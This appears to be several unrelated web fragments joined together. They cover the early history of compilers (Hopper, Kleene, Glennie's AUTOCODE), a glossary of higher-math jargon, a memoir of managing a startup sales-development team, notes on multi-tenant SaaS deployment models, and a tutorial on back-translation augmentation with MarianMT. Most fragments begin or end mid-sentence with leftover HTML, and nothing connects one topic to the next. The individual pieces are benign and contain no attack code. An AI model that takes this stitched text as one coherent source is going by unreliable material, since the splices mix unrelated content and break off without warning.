      or have parentheses, but not both.
      Also like Rutishauser's, Boehm's compiler is never
      implemented<a id="footnote-19-ref" href="#footnote-19">[19]</a>.
    </p>
    
    <p>Grace Hopper writes a linker-loader,
      and calls it a
      <term>compiler</term><a id="footnote-20-ref" href="#footnote-20">[20]</a>. Hopper seems to be the first
      person to use this term for a computer program.</p>
    
    <p>Hopper uses the term
      <term>compiler</term>
      in a meaning very close to one of its traditional senses:
      <q>to compose out of materials from other
        documents</q><a id="footnote-21-ref" href="#footnote-21">[21]</a>.
      Specifically, in 1952,
      subroutines were new,
      and automated programming
      (what we will come to call
      <q>compiling</q>)
      often is viewed as providing a interface
      for calling a collection of
      carefully chosen assembler subroutines<a id="footnote-22-ref" href="#footnote-22">[22]</a>.
      Hopper's new
      program takes this subroutine calling
      one step further -- instead of calling the subroutines
      it expands them (or in Hopper's terms
      <q>compiles</q>
      them) into
      a single program.
    </p>
    <p>
      After Hopper the term
      <term>compiler</term>
      will acquire a different meaning,
      one specific to the computer field.
      By 1956, programs like Hoppers will
      no longer be called
      <term>compilers</term><a id="footnote-23-ref" href="#footnote-23">[23]</a>.
    </p>
    
    <p>Kleene discovers regular languages<a id="footnote-24-ref" href="#footnote-24">[24]</a>.
      Kleene does not use regular expression notation,
      but his regular languages are the idea behind
      it.
    </p>
    
    <p>
      Glennie discovers what Knuth will later
      call the first
      <q>real</q><a id="footnote-25-ref" href="#footnote-25">[25]</a>
      compiler.
      (By this Knuth will mean that
      AUTOCODE was actually implemented and used by someone to translate
      algebraic statements into machine language.)
      Glennie's AUTOCODE
      is very close to the machine -- just above machine language.
      It does not allow operator expressions.
    </p>
    <p>
      AUTOCODE is hard-to-use,
      and apparently sees little use by anybody but
      Glennie himself.
      Because
      Glennie works for the British atomic weapons projects his papers
      are routinely classified,</p></div>

As a result, it is equipped with a system of specialized <strong><a aria-label="symbols (opens in a new tab)" href="https://mathvault.ca/hub/higher-math/math-symbols/" target="_blank" rel="noreferrer noopener">symbols</a></strong> and <strong>vocabularies</strong> — each with its own level of generality and formality.</p><p>Among these, there’s a particular subset of terms that is uniquely foundational and appropriate to our pursuit: the <strong>higher mathematical jargon</strong>. Loosely speaking, these are a set of specialized terms that fall into most — if not all — of the following categories:</p><ul><li>Specific to <strong>higher mathematics</strong></li><li><strong>English-looking</strong> (with a near-technical meaning)</li><li><strong>Frequently-occurring</strong></li><li><strong>Cross-disciplinary</strong> (i.e., not field-specific)</li></ul><p>In brief, these are terms that are generally accessible to most, yet still provide us with a glimpse of the world of non-miniaturized mathematics — and the way their practitioners act and think. In fact, in what follows, we’ve compiled a list of 106 such terms — along with some in-depth exploration of their <strong>definitions</strong>, <strong>examples</strong>, <strong>relevance</strong> and <strong>implications</strong>.</p><p>So if you’re ready to dive into this fascinating world that is known as mathematics, then let’s get started!</p><p>(and if you’re looking for a concise rendition of all the 106 terms featured in this glossary, then you might find the following <strong>higher math jargon mindmap</strong> both interesting and useful.)</p><span></span><figure><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Math-Glossary-Header-Image.png" alt="The Definitive Glossary of Higher Mathematical Jargons" width="1366" height="702" title="Math Glossary Header Image"></figure><h2 id="toc">Higher Mathematical Jargon — The Definitive List (106 Terms)</h2><p><span> The definitive glossary of higher mathematical jargon — from abstract nonsense, elementary proof to singularity and 101+ more. </span> <span><span>Click to Tweet</span><i></i></span></p><h2 id="abstraction"><a href="#toc">Abstraction</a></h2><p>The process of extracting the underlying <strong>structures</strong>, <strong>patterns</strong>, or <strong>properties</strong> of some mathematical objects, with the intention of generalizing these findings to a broader class of objects. These include, for example:</p><ul><li>Finding the <strong>shared properties</strong> of similar polynomials</li><li>Formalizing the <strong>general pattern</strong> of a sequence</li><li>Establishing a <a href="#otoc"><strong>one-to-one correspondence</strong></a> between two sets</li><li>Constructing an alternate <a href="#axiom"><strong>axiomatic system</strong></a> for Euclidean geometry</li></ul><p>At first, abstraction can seem a bit unappealing due to its higher cognitive demand and lack of connection to real-world phenomena. However, it can often turn out to be an integral force in bringing about a <strong>broaden applicability</strong> to a field — along with some <strong>unification</strong> in between the fields.</p><div><p>Did You Know?</p><p>While abstraction is involved in pretty much all subfields of mathematics, it is particularly well-represented in fields such as <strong>abstract algebra</strong>, <strong>model theory</strong>, <strong>axiomatic set theory</strong> and <a href="#nonsense"><strong>category theory</strong></a>.</p></div><h2 id="nonsense"><a href="#toc">Abstract Nonsense</a></h2><figure id="attachment_18333" aria-describedby="caption-attachment-18333"><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Category-Theory-Diagram.png" alt="Category Theory: A Category with Objects and Morphisms" width="325" height="325" title="Category Theory Diagram"><figcaption id="caption-attachment-18333">A category with objects $A$, $B$, $C$ and a series of morphisms.</figcaption></figure><p>A colloquial term for <strong><a href="https://en.wikipedia.org/wiki/Category_theory" target="_blank" rel="noopener noreferrer">category theory</a></strong> (a mathematical subject dedicated to the notion of category and the formalization of <a href="#structure">mathematical structures</a>), or the methods and arguments that are related to it.</p><p><span>Since different branches of mathematics deal with different mathematical structures satisfying the definition of a category, category theory can be regarded as a <strong>unifying theory</strong> of mathematics — whose results are applicable to a wide range of disciplines.</span></p><p>In particular, if a proposition follows from abstract nonsense, then it means that its argument has more to do with the underlying categorical structure of its objects — rather than the field where it’s found. And since such arguments are often highly abstract and long-winded by nature, they are also alternatively referred to as “<strong>general abstract nonsense</strong>” or “<strong>generalized abstract nonsense</strong>“.</p><h2 id="aon"><a href="#toc">Abuse of notation</a></h2><p>The act of inadvertently or deliberately using notations in a way that’s not entirely<strong> syntactically correct</strong> — but which simplifies the exposition and makes the passage easier to understand. For example, one might say that:</p><ul><li>“$\mathbb{R}$ is distributive” — rather than “$(\mathbb{R}, +, \times)$ is distributive.”</li><li>“$3$ is differentiable” — rather than “the function defined by the rule $x \mapsto 3$ for all real $x$, is differentiable.”</li><li>“$a+b+c = c+b+a$” — rather than “$(a+b) + c = (c+b) + a$”.</li></ul><p>In the cases where the context and the assumptions are made clear and well understood, abuses of notation are usually harmless (if not actually desirable). In other cases, however, the same might not be true, and can amount to a <strong>misuse of notation</strong> — which is a faux-pas in mathematics (such as the case of $\frac{\mathrm{d}y}{\mathrm{d}x}=\frac{y}{x}$).</p><h2 id="algo"><a href="#toc">Algorithm</a></h2><p>A finite series of <a href="#welldefined">well-defined</a>, <strong>computer-implementable instructions</strong> to solve a specific set of computable problems. It takes a finite amount of initial input(s), processes them unambiguously at each operation, before returning its outputs within a finite amount of time. Some examples of algorithm in mathematics include:</p><ul><li>The <strong>Euclidean algorithm</strong> (for finding the greatest common factor of two natural numbers)</li><li><a href="https://mathvault.ca/long-division">The <strong>long division algorithm</strong> (and its variants)</a></li><li>The <strong>simplex algorithm</strong> (for finding the optimal solution under a set of linear constraints)</li></ul><p>In essence, algorithms are created to streamline the solution-finding process for a specific set of problems, though it can also remove the necessity of thinking and understanding in the process. For a a series of instructions that are quasi-algorithmic and broader in nature, the term “<strong>general procedure</strong>” is sometimes used (which, like an algorithm, could also involve some element of <a href="#heuristics">heuristics</a> or <a href="#recursion">recursion</a>).</p><h2 id="almost"><a href="#toc">Almost</a></h2><figure id="attachment_18414" aria-describedby="caption-attachment-18414"><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Dart-and-Board.png" alt="Dart and Board" width="225" height="225" title="Dart and Board"><figcaption id="caption-attachment-18414">Since the actual circumference of the board has area 0, the probability of hitting it is also 0 as well (i.e., almost never).</figcaption></figure><p>A handy adverb similar to its usage in English, but can take on specific meanings depending on the context. For example:</p><ul><li>“<strong>Almost all</strong> elements in a set” usually means “all but a finite/countable amount of negligible elements in the set.”</li><li>“<strong>Almost no</strong> integer” usually means “only a finite subset of integers.”</li><li>“A property holds <strong>almost everywhere</strong> (in a measure space)” usually means “everywhere in a set except a subset of<a href="http://mathworld.wolfram.com/MeasureZero.html" target="_blank" rel="noopener noreferrer"> measure zero</a>.”</li><li>“An event occurs <strong>almost surely</strong>” usually means that “the event has a probability of 1, even though it does not include all of the possible outcomes.”</li><li>“An event occurs <strong>almost never</strong>” usually means that “the event has a probability of 0, even though it does contain some of the possible outcomes.”</li></ul><p>Here, notice that “almost” doesn’t necessarily mean that the <strong>exceptional cases</strong> are “small”, and hence one is perfectly well-justified in making claims such as “almost all real numbers are transcendental” — or that “the dart almost never lands on the circumference of the board.”</p><h2 id="ansatz"><a href="#toc">Ansatz</a></h2><p>A term of German origin meaning “initial placement of a tool at a work piece” (<a href="https://en.wikipedia.org/wiki/Ansatz" target="_blank" rel="noopener noreferrer">Wikipedia</a>), and is used in mathematics to refer to the initial, additional <strong>mathematical assumptions</strong> made to kick start the problem solving process — but which are later confirmed to be parts of the actual solution as well. Some examples of ansatz in mathematics include:</p><ul><li>The adoption of linear regression model to fit the data points (i.e., <strong>linear ansatz</strong>)</li><li>The assumption that the solutions to a differential/recurrent equation take an exponential form (<strong>exponential ansatz</strong>)</li><li>The assumption that the solution to a system of linear equations is expressible in terms of a particular vector (<strong>ansatz of particular solution</strong>).</li></ul><p>Metaphorically speaking, the use of ansatz can be liken to drawing a picture by first establishing a <strong>framework</strong>, in that if it succeeds, then the framework can be reused as an ansatz later on, but if it doesn’t, then it’s usually discarded and marked as an instance of failure.</p><h2 id="arbitrarily"><a href="#toc">Arbitrarily</a></h2><p>An adverb attached to a mathematical adjective X to make clear that something is “<strong>X with little limitation or restraint</strong>.” For example:</p><ul><li>An <strong>arbitrarily large</strong> function is a function capable of assuming values larger than any fixed choice of real number — regardless of the size of the latter.</li><li>An <strong>arbitrarily small</strong> positive sequence is a sequence capable of assuming values smaller than any fixed choice of positive real number — regardless of the “tininess” of the latter.</li><li>An <strong>arbitrarily long</strong> progression is a progression whose number of members can be made to exceed than any choice of natural number — regardless the size of the latter.</li></ul><p>In general, “arbitrarily” is a foundational term in number theory and mathematical analysis, and can also occur in other topics where some form of <strong>degree</strong> and <strong>ordering</strong> are involved (e.g., <a href="https://en.wikipedia.org/wiki/Polynomial_ring" target="_blank" rel="noopener noreferrer">polynomial ring</a>).</p><div><p>Caution</p><p>Don’t make the mistake in assuming that “arbitrarily” means “infinitely”! If anything, “arbitrarily” usually carries a sense of being “without bound within the finite realm.”</p></div><h2 id="arbitrary"><a href="#toc">Arbitrary</a></h2><p>An adjective used to refer to a choice made without any specific criterion or restraint (e.g., arbitrary integer, arbitrary division of a set, arbitrary permutation of a sequence). It corresponds to the term “<strong>any</strong>” and the <a href="https://mathvault.ca/hub/higher-math/math-symbols/logic-symbols/#Quantifiers" target="_blank" rel="noopener noreferrer">logical quantifier</a> $\forall$, and hints at an element of generality in the phrase where it’s found (e.g., statement $P$ holds for an arbitrary $n \in \mathbb{N}$).&nbsp;</p><div><p>Arbitrary vs. Random</p><p>While “random” and “arbitrary” are often used interchangeably in informal discourses, in mathematics, “random” — unlike “arbitrary” — usually presupposes that the outcomes follow a <a href="https://mathvault.ca/hub/higher-math/math-symbols/probability-statistics-symbols/#Discrete_Probability_Distributions" target="_blank" rel="noopener noreferrer"><strong>probability distribution</strong></a>, and as such might have predictable probabilities even if the outcomes are subject to chance and unpredictability.</p></div><h2 id="axiom"><a href="#toc">Axiom</a></h2><figure id="attachment_18546" aria-describedby="caption-attachment-18546"><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Parallel-Postulate.png" alt="Illustration of Parallel Postulate" width="320" height="240" title="Parallel Postulate"><figcaption id="caption-attachment-18546">Pictorial representation of the parallel postulate</figcaption></figure><p>Axioms, also known as postulates, are mathematical premises which are assumed to be<strong>&nbsp;true</strong> and along with <a href="#def">definitions</a>, form the foundation of a <a href="#theory">mathematical <span>theory</span></a>.</p><p>In general, axioms can be divided into two types: <strong>logica</strong>l and <strong>non-logical</strong>. The logical axioms are the ones pertaining to the logical part of mathematics (e.g., $[A\rightarrow (B \wedge -B)] \rightarrow -A\,$), while the non-logical axioms are the ones pertaining to the <em>nature</em> of the theory itself (which might or might not be self-evident by nature).</p><p>For example, the <strong><a href="https://en.wikipedia.org/wiki/Parallel_postulate" target="_blank" rel="noopener noreferrer">parallel postulate</a></strong> — which stands as the most well-known (non-logical) axiom among the five in Euclidean geometry — states that:</p><blockquote><p>“If a line segment intersects two straight lines forming two interior angles on the same side that sum to less than two right angles, then the two lines, …</p></blockquote></section></div></div></div></div></div>

I wanted to have a huge impact on the company and I rallied behind their mission. We were going to make a difference.</p><p>I was the first manager hire in the sales department, running the sales development team (SDR team). I didn't know it at the time, but this was going to be one of the most impactful experiences in my life.</p><figure><p><img alt="Rat infested office" src="https://assets.website-files.com/5ef609325c969f70601c7074/5ef60adf83cbb075d3c38022_image-asset.jpeg"></p><figcaption>Rat infested office</figcaption></figure><p>Hockey stick growth, constant change, and incredibly high pressure. I was hired to manage the SDR team that was responsible for generating every meeting conducted by the account executives. My team started with 3 and quickly grew to a team of 12 SDRs fighting daily to hit aggressive metrics.</p><p>I loved every second of it.</p><p>We started in a small office with rats... literally. In under two years, the company grew by 600%+ and achieved a 21 million dollar series B funding round.</p><p>Yes, we did upgrade the office situation along the way.</p><p>Every deal closed by the account executives had come from the SDR team. Managing and scaling the SDR team was not easy, but I am proud of how we did it and what the team achieved.</p><p>In this article, I'll share some of my story and what I learned along the way.</p><h2><strong>Learning #1: The core of our success was daily motivation. Not incentives.</strong></h2><p>There was one situation during my startup experience that really stands out and illustrates the power of motivation. There was less than a week left in the month and my team was behind on their quota by a significant amount, it basically wasn't going to happen. Morale was down and despite my efforts of cheering up the team, they felt down on their luck. Then something special happened.</p><p>The entire company was packed in our small conference room for an "all hands" meeting. There wasn't enough space in the room and 10 people had to stand outside and cup their hands over their ears just to hear. I was one of those people.</p><p>My boss was giving his update and said: "As for the SDR team, they are not going to get close to hitting quota this month."</p><p>My jaw hit the floor, you never claim defeat before the final bell tolls.</p><p>I quickly said "hey!" a little too loud as I squeezed passed my colleagues to get into the conference room. The entire company was staring at me and you could hear a pin drop.</p><p>I wasn't thinking, I was reacting.</p><p>"Don't count us out. Does it look like we will hit quota? No. Not even close. But what I can tell you is that if ANY team can do it, its this one. Do NOT count us out."</p><p>The next day I pulled my team aside in the morning and addressed what happened the day before. We all agreed. We were going to make them eat their words.</p><p>What happened next was nothing short of amazing. I had never seen my team so fired up. They were cheering each other on, laughing together, and booking more meetings than they even thought possible.</p><p>Over the next four days, they broke their "most meetings booked in a day" record twice.</p><p>And when the final bell tolled, we were short by one meeting.</p><p>You would have thought we had beat our quota by 200%. They didn't care that we missed our team quota by one. They were ecstatic that when everyone in the company thought we couldn't get close, we did.</p><p><strong>Incentives are important but they do not replace the ability to motivate a team around an objective.</strong></p><p>A team is a group of individuals rallied around a specific objective. Unfortunately, the daily work often has a way of causing the individual to lose sight of that objective. This is very prevalent in SDR teams because the daily work comes with rejection, repetitive tasks, and variables outside of their control.</p><p>After that experience, I started spending 10 minutes every morning with my team reminding them of why we are doing this. Pointing at our previous successes and pointing to the potential successes on the horizon. I never stopped motivating the team. I never stopped reminding them of what we accomplished and challenging them to repeat it.</p><p>The next month was the biggest one we had ever had.</p><p>Incentives are important but they do not replace the ability to motivate a team around an objective.</p><p><strong>Action tip:</strong> Create a schedule with daily objectives. Share it with the team and motivate them by connecting each daily objective with a larger goal.</p><h2>Learning #2: Motivation is about narratives, you must create compelling ones.</h2><p>Motivating my team was necessary because we had to make changes so frequently. There was one change in particular that really stands out. We decided to change our entire target market. yeah, a big decision. Because of this, my team was going to have fewer leads and entirely different messaging. Needless to say, they were going to be less than thrilled. In order for us to be able to execute, I needed to get them excited about the change.</p><p>The first step was, I had to be on board. The team leader must believe in the initiative. Fortunately, that was easy. I was totally on board and ready to tackle the challenge.</p><p>The second step was, the team needed to understand the reason behind the change and agree that it was necessary.</p><p>The third and final step was the most challenging. I needed to motivate the team to execute. This required a strong narrative.</p><p>When it came time to tell my team about the change they jumped on board quickly. There were a few concerns that I addressed and then we shifted our focus quickly. I attribute how well received it was to the type of people we hired and to the work I did planning how to deliver the message.</p><p>Here is the template I used to construct the message and successfully motivate the team to execute.</p><p><strong>The "why" behind this change:</strong></p><p><strong>Why us:</strong></p><p><strong>What happens when this change is successful:</strong></p><p><strong>What this means for them:</strong></p><p><strong>How we can exceed expectations:</strong></p><p>Startups change a lot. This requires employees to adapt quickly and often. It can be exhausting. Building a narrative around every change is how you can motivate the team and get them on board. This results in them adapting more quickly with less change fatigue.</p><p><strong>Action Tip:</strong> Expect change, don't just react to it. Create a plan that covers "what to do" and "how to communicate it" for major outcomes (new leadership, hirings/firings, etc).</p><h2>Learning #3: Take ownership of everything.</h2><p>When my team was at its peak of 12 people I was managing a lot of different personalities. One rep, in particular, was always late to meetings, skipped out of our one on ones, and intentionally isolated themselves from the team. It was very challenging for me because I liked them a lot as a person but as a member of the team, they were very tough to manage. As their performance slipped I tried to help but it kept getting worse. Finally, they told me that they felt "better than the role" and it all made sense. They were embarrassed to be an SDR because they viewed it as a step back in their career.</p><p>Due to poor performance, I ended up having to let go of this employee, something I take very seriously. I reflected on this for a long time as it was my first experience firing someone. It hit me hard.</p><p>I wanted to chalk it up to them feeling "better than the role" but I had to take ownership of something to learn and grow from the experience. I reflected on what was in my control and determined that I enabled their belief that they were better than the role. The truth is, at the time I felt that they had more experience than me. My own insecurities were exposed through my actions. I didn't hold them accountable, I didn't effectively communicate my concerns, and frankly...</p><p>I didn't do a great job as their leader.</p><p>There will always be things outside of your control, it's inevitable. It's easy to point to the uncontrollable variables and assign blame. While scaling an SDR team you must take ownership of everything and focus your energy on what is/was in your control.</p><p>I learned from that experience and have never let it happen again.</p><p><strong>Action tip:</strong> Regardless of the situation take ownership of the result. Find what was in your control, identify what you could of done better, and improve.</p><h2>Learning #4: Cut poor performers.</h2><p>While leading the SDR team I got extremely close to each and every one. I felt invested in them as SDRs and as people. I wanted everyone to succeed and I would go to great lengths to help them improve.</p><p>But when it came time to cut ties, I would clam up. I tied so much of my success as a manager to the success of each individual on the team, remember the whole "take ownership of everything" thing from above? The idea of accepting defeat by letting go of an SDR crushed me.</p><p>Once you've been in a leadership position for a long enough time you learn that the team itself should be looked at as an individual. Once the repetitive actions of one team member hurt the team as a whole a leader must act.</p><p>I now follow a simple rule. I put a lot of energy into helping a struggling SDR improve. If they do not take action on my support and continue to perform poorly, I let them go. If they do take action on my support, and still perform poorly, I try to get them a different role at the company. James Collins, in his book Good to Great, says "put the right person in the right seat." If you have a great employee who is struggling in the role, you should find the right role for them.</p><p><strong>Action tip:</strong> Do not hesitate to cut poor performers. Additionally, if you have the right person make sure that they are in "the right seat."</p><h2>Learning #5: Hire the right people.</h2><p>The first group of SDRs I hired was an eclectic group. An international policy expert, Alaskan snowmobile racer, capital investment analyst, and a kid who almost flunked out of college because his kidney exploded. They all shared two things in common. They were very hard working and had a quirky personality that made them stand out.</p><p>Hiring is very challenging, especially when you are a startup. A wrong hire costs money but also another valuable resource for startups. Time. There is no debate about the importance of hiring the right people.</p><p>My hiring philosophy - Hire hardworking people with unique personalities.</p><p>If you are able …</p></div></div>

<p><img data-original-height="392" data-original-width="1176" src="https://1.bp.blogspot.com/-c8iAON90hE8/X0u6DaURFlI/AAAAAAAAEzI/dENaZvr7StEWfYHQXURz4wBd_D_XA73bACLcBGAsYHQ/s640/multitenancy.png" width="640"></p>


<p>Multi-tenancy Application Deployment Architecture could be modeled in 4 broad ways:</p>

<ol>
	<li>Separate Apps &amp; Separate Databases</li>
	<li>Shared Apps &amp; Shared Databases</li>
	<li>Separate Apps &amp; Shared Databases</li>
	<li>Shared Apps &amp; Separate Databases</li>
</ol>
<p>There is no right or wrong here. It's about choice and consequence that you should consider taking into your business context and constraints. In this post I intend to jot down a some key points to keep in mind for each of these multi-tenant architecture.&nbsp;</p>

<h4>Separate Apps &amp; Separate Databases</h4>
<div>
	<ul>
		<li>Easiest to implement from development and deployment stand-point.</li>
		<li>Just automate the deployment infrastructure for every tenant for quick set-up.</li>
		<li>Most expensive of all the models from infrastructure cost stand-point.</li><li>Relatively longer deployment time for newer application versions, at scale.&nbsp;</li><li>More wastage from infrastructure resource utilization point of view.</li>
		<li>The application's statelessness criteria for scalability would mean:
			<ul><li>not holding user-request data</li></ul>
		</li>
		<li>Suitability:
		<ul>
			<li>This is the best way to begin your SAAS platform, for product-market fitment until stability and growth.</li>
			<li>When you provide SAAS as white-labelled product.</li>
			<li>When you deploy your SAAS product at client infrastructure, maybe for compliance reasons.</li>
		</ul></li>
		<li>Challenges:
		<ul>
			<li>How do you optimize resources for cost?</li>
		</ul></li>
	</ul>
</div>

<h4>Shared Apps &amp; Shared Databases</h4>
<div>
	<ul>
		<li>The most complex beast of all the multi-tenancy architectures.</li>
		<li>Maximizing infra utilization every bit for maximum profitability.&nbsp;</li>
		<li>Challenges:&nbsp;&nbsp;</li>
		<ul>
			<li>How do you manage as volume of transactions&nbsp; and data increases? The relational database by its virtue is vertically scalable and not horizontally scalable. Now this means it could become a bottleneck sooner than you think as you onboard more and more tenants, depending on the volume of transactions and data.</li>
			<li>In case of SaaS apps that provides lot of customizations on the UI, how do you get this tenant specific configuration optimally for latency? <a href="https://www.wix.com/ecommerce/website" target="_blank">Wix eCommerce</a>, <a href="https://www.shopify.in/tour/ecommerce-website" target="_blank">Shopify</a>, etc.</li>
		</ul>
	</ul>
</div>

<h4>Separate Apps &amp; Shared Databases</h4>
<div>
	<ul>
		<li>A model where tenant specific configuration are tied to deployed instances, but all share a common database. The data isolation per client is achieved by prefixing database schema with tenant info.&nbsp;</li>
		<li>You got many web-frameworks and web-plugins supporting this model of prefixing-queries with tenant specific data, to hit the right datasource. For example, <a href="https://github.com/influitive/apartment" target="_blank">apartment</a> (rails/ruby), <a href="https://github.com/tenancy/multi-tenant" target="_blank">multi-tenant</a> (laravel/php), springboot (java), etc.</li>
		<li>Relational database instances are expensive. It way pricier than your application instances and is not as disposable as your compute instances can are. You got to do a bit of forward looking into future for its capacity planning.</li>
		<li>When you are managing your database instance as a SaaS provider and want to optimize on the overall cost, often the easiest thing to do is use shared database.</li>
		<li>The application's statelessness criteria for scalability would mean:</li>
		<ul>
			<li>not holding user-request data</li>
			<li>not holding database-responses</li>
		</ul>
		<li>Challenges:&nbsp;</li>
		<ul>
			<li>How do you manage as volume of transactions&nbsp; and data increases? The relational database by its virtue is vertically scalable and not horizontally scalable. Now this means it could become a bottleneck sooner than you think as you onboard more and more tenants, depending on the volume of transactions and data.</li>
		</ul>
	</ul>
	<br>
</div>
<h4>Shared Apps &amp; Separate Databases</h4>
<div>
	<ul>
		<li>A request can hit any of the available application instance.</li>
		<li>Tenant specific configuration is got dynamically with every request.</li>
		<li>The application's statelessness criteria for scalability would mean:</li>
		<ul>
			<li>not holding user-request data</li>
			<li>not holding tenant's configuration</li>
			<li>not holding database-responses</li>
		</ul>
		<li>Challenges:&nbsp;</li>
		<ul>
			<li>How do you hit the right database dynamically on a per request basis? How do you do it optimally for latency? Think&nbsp; of Atlassian suite of products like <a href="https://www.atlassian.com/software/confluence" target="_blank">Confluence</a>, <a href="https://www.atlassian.com/software/jira/agile" target="_blank">Jira</a>, <a href="https://www.atlassian.com/software/bitbucket" target="_blank">Bitbucket </a>etc.</li>
			<li>In case of SaaS apps that provides lot of customization on the UI, how do you get this tenant specific configuration optimally for latency? <a href="https://www.wix.com/ecommerce/website" target="_blank">Wix eCommerce</a>, <a href="https://www.shopify.in/tour/ecommerce-website" target="_blank">Shopify</a>, etc.</li>
		</ul>
	</ul><p>Hope that helps you in your design choice for your SAAS architecture...</p>

<section itemprop="text">
<p>Hugging Face recently released <a href="https://huggingface.co/models?search=Helsinki-NLP%2Fopus-mt">1008 translation models</a> for almost 140 languages on their model hub.</p>
<p>These models were originally trained by <a href="https://researchportal.helsinki.fi/en/persons/j%C3%B6rg-tiedemann">Jörg Tiedemann</a> of the <a href="https://blogs.helsinki.fi/language-technology/">Language Technology Research Group at the University of Helsinki</a>. They were trained on the <a href="http://opus.nlpl.eu/">Open Parallel Corpus(OPUS)</a> using a neural machine translation framework called <a href="https://marian-nmt.github.io/">MarianNMT</a>.</p>
<p>In this post, I will explain how you can use the MarianMT models to augment data text data.</p>
<h2 id="back-translation">Back Translation</h2>
<p>We will use a data augmentation technique called “Back Translation”. In this, we take an original text written in English. Then, we convert it into another language (eg. French) using MarianMT. We translate the French text back into English using MarianMT. We keep the back-translated English text if it is different from the original English sentence.</p>
<p><img src="https://amitness.com/images/back-translation-marianmt.png" alt="Backtranslation with MarianMT"></p>
<h2 id="augmentation-process-">Augmentation Process <a href="https://colab.research.google.com/drive/1J_KpNYj03gecT0p9s6YeDcDJHKgPn1Hh?usp=sharing"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"></a></h2>
<p>First, we need to install Hugging Face transformers and Moses Tokenizers with the following command</p>
<div><div><pre><code>pip <span>install</span> <span>-U</span> transformers 
pip <span>install </span>mosestokenizer
</code></pre></div></div>
<p>After installation, we can now import the MarianMT model and tokenizer.</p>
<div><div><pre><code><span>from</span> <span>transformers</span> <span>import</span> <span>MarianMTModel</span><span>,</span> <span>MarianTokenizer</span>
</code></pre></div></div>
<p>Then, we can create a initialize the model that can translate from English to Romance languages. This is a single model that can translate to any of the romance languages()</p>
<div><div><pre><code><span>target_model_name</span> <span>=</span> <span>'Helsinki-NLP/opus-mt-en-ROMANCE'</span>
<span>target_tokenizer</span> <span>=</span> <span>MarianTokenizer</span><span>.</span><span>from_pretrained</span><span>(</span><span>target_model_name</span><span>)</span>
<span>target_model</span> <span>=</span> <span>MarianMTModel</span><span>.</span><span>from_pretrained</span><span>(</span><span>target_model_name</span><span>)</span>
</code></pre></div></div>
<p>Similarly, we can initialize models that can translate Romance languages to English.</p>
<div><div><pre><code><span>en_model_name</span> <span>=</span> <span>'Helsinki-NLP/opus-mt-ROMANCE-en'</span>
<span>en_tokenizer</span> <span>=</span> <span>MarianTokenizer</span><span>.</span><span>from_pretrained</span><span>(</span><span>en_model_name</span><span>)</span>
<span>en_model</span> <span>=</span> <span>MarianMTModel</span><span>.</span><span>from_pretrained</span><span>(</span><span>en_model_name</span><span>)</span>
</code></pre></div></div>
<p>Next, we write a helper function to translate a batch of text given the machine translation model, tokenizer and the target romance language.</p>
<div><div><pre><code><span>def</span> <span>translate</span><span>(</span><span>texts</span><span>,</span> <span>model</span><span>,</span> <span>tokenizer</span><span>,</span> <span>language</span><span>=</span><span>"fr"</span><span>):</span>
    <span># Prepare the text data into appropriate format for the model
</span>    <span>template</span> <span>=</span> <span>lambda</span> <span>text</span><span>:</span> <span>f"</span><span>{</span><span>text</span><span>}</span><span>"</span> <span>if</span> <span>language</span> <span>==</span> <span>"en"</span> <span>else</span> <span>f"</span><span>{</span><span>language</span><span>}</span><span>&lt;&lt; </span><span>{</span><span>text</span><span>}</span><span>"</span>
    <span>src_texts</span> <span>=</span> <span>[</span><span>template</span><span>(</span><span>text</span><span>)</span> <span>for</span> <span>text</span> <span>in</span> <span>texts</span><span>]</span>

    <span># Tokenize the texts
</span>    <span>encoded</span> <span>=</span> <span>tokenizer</span><span>.</span><span>prepare_translation_batch</span><span>(</span><span>src_texts</span><span>)</span>
    
    <span># Generate translation using model
</span>    <span>translated</span> <span>=</span> <span>model</span><span>.</span><span>generate</span><span>(</span><span>**</span><span>encoded</span><span>)</span>

    <span># Convert the generated tokens indices back into text
</span>    <span>translated_texts</span> <span>=</span> <span>tokenizer</span><span>.</span><span>batch_decode</span><span>(</span><span>translated</span><span>,</span> <span>skip_special_tokens</span><span>=</span><span>True</span><span>)</span>
    
    <span>return</span> <span>translated_texts</span>
</code></pre></div></div>
<p>Next, we will prepare a function to use the above <code>translate()</code> function to perform back translation.</p>
<div><div><pre><code><span>def</span> <span>back_translate</span><span>(</span><span>texts</span><span>,</span> <span>target_lang</span><span>=</span><span>"fr"</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>):</span>
    <span># Translate from source to target language
</span>    <span>fr_texts</span> <span>=</span> <span>translate</span><span>(</span><span>texts</span><span>,</span> <span>target_model</span><span>,</span> <span>target_tokenizer</span><span>,</span> 
                         <span>language</span><span>=</span><span>target_lang</span><span>)</span>

    <span># Translate from target language back to source language
</span>    <span>back_translated_texts</span> <span>=</span> <span>translate</span><span>(</span><span>fr_texts</span><span>,</span> <span>en_model</span><span>,</span> <span>en_tokenizer</span><span>,</span> 
                                      <span>language</span><span>=</span><span>source_lang</span><span>)</span>
    
    <span>return</span> <span>back_translated_texts</span>
</code></pre></div></div>
<p>Now, we can perform data augmentation using back-translation from English to Spanish on a list of sentences as shown below.</p>
<div><div><pre><code><span>en_texts</span> <span>=</span> <span>[</span><span>'This is so cool'</span><span>,</span> <span>'I hated the food'</span><span>,</span> <span>'They were very helpful'</span><span>]</span>

<span>aug_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>en_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"es"</span><span>)</span>
<span>print</span><span>(</span><span>aug_texts</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code><span>[</span><span>"Yeah, it's so cool."</span><span>,</span> <span>"It's the food I hated."</span><span>,</span> <span>'They were of great help.'</span><span>]</span>
</code></pre></div></div>
<p>Similarly, we can perform augmentation using English to French as shown below with the exact same helper method.</p>
<div><div><pre><code><span>en_texts</span> <span>=</span> <span>[</span><span>'This is so cool'</span><span>,</span> <span>'I hated the food'</span><span>,</span> <span>'They were very helpful'</span><span>]</span>
<span>aug_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>en_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"fr"</span><span>)</span>

<span>print</span><span>(</span><span>aug_texts</span><span>)</span>
